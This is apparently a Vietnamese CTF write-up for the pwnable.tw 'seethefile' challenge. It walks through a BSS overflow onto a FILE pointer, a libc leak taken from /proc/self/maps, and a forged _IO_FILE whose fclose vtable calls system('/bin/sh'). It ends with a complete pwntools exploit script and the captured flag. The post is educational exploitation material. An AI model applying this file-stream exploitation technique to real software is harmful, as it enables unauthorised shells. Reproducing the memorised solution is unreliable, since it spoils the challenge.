+++
title = 'Pwnable.tw - seethefile'
date = 2026-09-18T21:55:05+07:00
draft = false
categories = ["pwn"]
series = ["Pwnable.tw"]
+++

## seethefile

`nc chall.pwnable.tw 10200`

### 1. Phân tích Binary

```js
pwndbg> checksec
File:       /home/lwd3c/Desktop/Pwn/pwnable.tw/seethefile/seethefile_patched
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8046000)
RUNPATH:    b'.'
Stripped:   No
```

libc đi kèm là glibc 2.23, `system` ở offset `0x3a940`. Không PIE nên mọi địa chỉ BSS/GOT đều tĩnh.

`main` là vòng lặp vô hạn, mọi nhánh đều `exit()` hoặc quay về menu, nên canary có lưu nhưng không bao giờ được kiểm tra.

```c
while (1) {
    menu();
    scanf("%s", nptr);
    switch (atoi(nptr)) {
        case 1: openfile();  break;
        case 2: readfile();  break;
        case 3: writefile(); break;
        case 4: closefile(); break;
        case 5:
            printf("Leave your name :");
            scanf("%s", name);           // <- overflow BSS
            printf("Thank you %s ,see you next time\n", name);
            if (fp) fclose(fp);
            exit(0);
        default: exit(0);
    }
}
```

- `openfile()`: `scanf("%63s", filename)`, chặn nếu `strstr(filename, "flag")`, rồi `fp = fopen(filename, "r")`
- `readfile()`: `fread(magicbuf, 0x18F, 1, fp)` - đọc đúng 399 bytes mỗi lần và **tiến offset**
- `writefile()`: chặn nếu tên file chứa `flag`, hoặc nội dung chứa `FLAG` / `}`, còn lại `puts(magicbuf)`

#### Bug - tràn BSS vào `fp`

```js
filename  @ 0x804b080
magicbuf  @ 0x804b0c0   (0x190)
name      @ 0x804b260   <- scanf("%s") không giới hạn
fp        @ 0x804b280   (name + 0x20)
GOT       @ 0x804b000 - 0x804b048
```

`scanf("%s", name)` đọc không giới hạn, mà `fp` nằm đúng `name + 0x20`, nên `b'A'*0x20 + p32(target)` là điều khiển hoàn toàn con trỏ `FILE *`.

GOT nằm **dưới** `name` nên overflow hướng lên không chạm tới - bỏ hướng GOT hijack. Phía trên `fp` là BSS trống, chỗ lý tưởng để đắp fake `_IO_FILE_plus` ngay trong cùng chuỗi overflow.

### 2. Khai thác

#### Leak libc qua `/proc/self/maps`

Tên file `/proc/self/maps` không chứa `flag` nên mở được, nội dung cũng không chứa `FLAG` hay `}` nên `writefile` không chặn. `fread` đọc từng chunk 399 bytes và tiến offset, nên gọi Read/Write lặp lại là cuộn được hết file.

```py
for _ in range(12):
    menu(2); recvuntil(b'Read Successful')
    menu(3); chunk = recvuntil(b'---------------MENU---------------', drop=True)
    for line in chunk.split(b'\n'):
        if b'libc' in line and b'r-xp' in line:
            return int(line.split(b'-')[0], 16)
```

Phải bắt đúng dòng `r-xp` (offset 0). Các dòng `r--p`/`rw-p` của libc sau đó là `base + 0x1ad000`, lấy nhầm là sai toàn bộ.

```bash
f75f3000-f77a0000 r-xp 00000000 08:00 2652247  /lib32/libc-2.23.so
```

#### FSOP qua `fclose`

Disassemble `_IO_fclose@@GLIBC_2.1` trong đúng bản libc này (offset `0x5cec0`):

```asm
5cec0: mov  esi, [ebp+8]          ; fp
5ced7: cmp  BYTE PTR [esi+0x46],0 ; vtable_offset
5cee1: mov  eax, [esi]            ; flags
5cee3: test ah,0x20
5cee6: jne  5d060                 ; -> _IO_un_link(fp)
5cf40: call _IO_file_close_it(fp) ; fileno == -1 -> return ngay
5cf94: movsx eax, BYTE PTR [esi+0x46]
5cf9b: mov  eax, [esi+0x94]       ; vtable = *(fp + 0x94)
5cfa4: push esi                   ; arg1 = fp
5cfa5: call DWORD PTR [eax+0x8]   ; vtable->__finish(fp, 0)
```

Hai điểm quan trọng, đều đọc ra từ disasm chứ không nhớ sẵn: `_IO_FILE` bản 32-bit này có vtable tại **`fp + 0x94`**, và nhánh `fclose` **không gọi `_IO_validate_vtable`** - vtable đặt ở đâu cũng được.

Fake FILE đắp tại `BFL = 0x804b284`, ngay sau `fp`:

```js
0x00  "/bin/sh\0"     flags, đồng thời là chuỗi lệnh cho system(fp)
0x38  0xffffffff      fileno = -1 -> _IO_file_close_it return ngay
0x46  0x00            vtable_offset
0x48  BFL + 0x100     lock, trỏ vào BSS ghi được
0x94  BFL + 0x110     vtable
0x110 0x00            __dummy
0x114 0x00            __dummy2
0x118 system          [vtable+8] = __finish
```

Dword đầu tiên vừa là chuỗi `/bin/sh` cho `system(fp)`, vừa là `_flags` điều khiển nhánh của `fclose`: byte 0 là `0x2f` nên không có `_IO_LINKED`, byte 1 là `0x62` có bit `0x2000` nên đi vào `_IO_un_link` rồi return ngay.

`fclose(0x804b284)` cuối cùng gọi `system(0x804b284)` = `system("/bin/sh")`.

#### Các bẫy trên remote

- stdin remote là socket nên `fopen("/proc/self/fd/0")` và `/dev/stdin` đều fail. Vì vậy không nạp fake FILE qua self-input mà đắp toàn bộ trong chuỗi overflow - cách này chạy được cả local lẫn remote.
- Payload đi qua `scanf("%s")` nên không được chứa whitespace `0x09-0x0d, 0x20`. Byte thấp của `system` luôn là `0x40`, nhưng byte thứ hai tuỳ ASLR có thể rơi vào whitespace làm payload bị cắt - gặp thì kết nối lại.
- Sau khi shell spawn phải `sleep` trước khi gửi lệnh, không thì `scanf` của menu nuốt mất lệnh và chương trình `exit(0)`.
- Flag ở `/home/seethefile/flag` mode `-r--------` của user `flag` nên không `cat` được. Có `/home/seethefile/get_flag` SUID, hỏi `Your magic :` và cần đúng chuỗi `Give me the flag`.

```bash
[+] libc base = 0xf75f3000  system = 0xf762d940
uid=1000(seethefile) gid=1000(seethefile) groups=1000(seethefile)
Your magic :Here is your flag: FLAG{F1l3_Str34m_is_4w3s0m3}
```

`FLAG: FLAG{F1l3_Str34m_is_4w3s0m3}`

```py
#!/usr/bin/env python3
from pwn import *
import time

exe = ELF('seethefile_patched', checksec=False)
libc = ELF('libc_32.so.6', checksec=False)

context.binary = exe
context.os = 'linux'
context.arch = 'i386'

BFL = 0x804b284   # bss ngay sau global fp -> nơi đắp fake _IO_FILE_plus

def build_leak(p):
    p.sendlineafter(b'Your choice :', b'1')
    p.sendlineafter(b'What do you want to see :', b'/proc/self/maps')
    p.recvuntil(b'Open Successful')
    for _ in range(12):
        p.sendlineafter(b'Your choice :', b'2')
        p.recvuntil(b'Read Successful')
        p.sendlineafter(b'Your choice :', b'3')
        chunk = p.recvuntil(b'---------------MENU---------------', drop=True)
        for line in chunk.split(b'\n'):
            if b'libc' in line and b'r-xp' in line:
                return int(line.split(b'-')[0], 16)
    raise RuntimeError('libc base not found')

def build_fake(system):
    f = bytearray(0x118)
    f[0x00:0x08] = b'/bin/sh\x00'              # flags + chuỗi lệnh cho system(fp)
    f[0x38:0x3c] = p32(0xffffffff)             # fileno = -1
    f[0x46:0x47] = b'\x00'                     # vtable_offset
    f[0x48:0x4c] = p32(BFL + 0x100)            # lock
    f[0x94:0x98] = p32(BFL + 0x110)            # vtable
    f[0x110:0x118] = p32(0) * 2                # __dummy, __dummy2
    f[0x118:0x11c] = p32(system)               # __finish == system
    return bytes(f)

def attempt():
    p = process([exe.path]) if not args.REMOTE else remote('chall.pwnable.tw', 10200, timeout=15)
    try:
        libc.address = build_leak(p)
        system = libc.sym['system']
        log.success(f'system = {system:#x}')

        payload = b'A' * 0x20 + p32(BFL) + build_fake(system)
        p.sendlineafter(b'Your choice :', b'5')
        p.sendlineafter(b'Leave your name :', payload)   # -> fclose(fake) -> system("/bin/sh")

        time.sleep(0.6)
        p.sendline(b'id; echo SHELL_OK')
        time.sleep(0.5)
        p.sendline(b'/home/seethefile/get_flag')
        time.sleep(0.4)
        p.sendline(b'Give me the flag')
        time.sleep(1.0)
        out = p.recvrepeat(timeout=3)
        log.info('reply:\n' + out.decode(errors='replace'))
        if b'FLAG{' in out or b'SHELL_OK' in out:
            return p, out
        p.close()
    except Exception as e:
        log.warn('attempt failed: %r' % e)
        try: p.close()
        except: pass
    return None, None

if __name__ == '__main__':
    rp = None
    for i in range(10):
        log.info(f'--- attempt {i} ---')
        rp, ro = attempt()
        if rp is not None:
            break
        time.sleep(1)
    if rp is None:
        exit(1)
    rp.interactive()
```
